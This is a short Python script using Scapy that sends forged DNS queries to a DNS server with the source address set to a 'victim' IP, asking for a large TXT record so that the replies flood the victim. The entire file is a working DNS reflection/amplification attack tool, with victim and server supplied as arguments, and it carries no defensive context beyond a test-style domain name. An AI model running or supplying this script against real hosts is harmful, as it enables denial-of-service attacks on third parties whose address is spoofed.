from scapy.all import IP, UDP, DNS, DNSQR, send
import sys
import time

victim_ip = sys.argv[1]
dns_server_ip = sys.argv[2]
count = int(sys.argv[3]) if len(sys.argv) > 3 else 50
delay = float(sys.argv[4]) if len(sys.argv) > 4 else 0.1

pkt = IP(src=victim_ip, dst=dns_server_ip) / \
      UDP(sport=53, dport=53) / \
      DNS(rd=1, qd=DNSQR(qname="bigrecord.test", qtype="TXT"))

for i in range(count):
    send(pkt, verbose=0)
    time.sleep(delay)

print(f"Sent {count} spoofed queries: claimed src={victim_ip} -> dst={dns_server_ip}")